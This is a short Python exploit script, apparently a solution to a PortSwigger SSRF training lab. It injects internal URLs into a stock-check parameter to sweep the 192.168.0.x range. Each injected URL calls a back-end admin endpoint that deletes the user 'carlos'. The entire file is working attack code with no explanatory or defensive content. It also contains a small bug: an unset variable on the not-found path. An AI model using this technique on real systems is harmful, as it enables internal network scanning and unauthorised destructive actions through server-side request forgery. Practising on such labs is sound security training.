# https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system

import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def check_admin_hostname(url):
    stock_path="/product/stock"
    for i in range(1,256):
        hostname = 'http://192.168.0.%s:8080/admin/delete?username=carlos' %i
        params = {'stockApi': hostname}
        r = requests.post(url + stock_path, data=params, verify=False, proxies=proxies)
        if r.status_code == 200:
            admin_ip_address = '192.168.0.%s' %i
            print ("(+) Found the admin ip address: %s" % admin_ip_address)
            break
    if admin_ip_address == '':
        print("(-) Could not find admin hostname.")
    return admin_ip_address

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(1)

    url = sys.argv[1]
    check_admin_hostname(url)




if __name__ == "__main__":
    main()
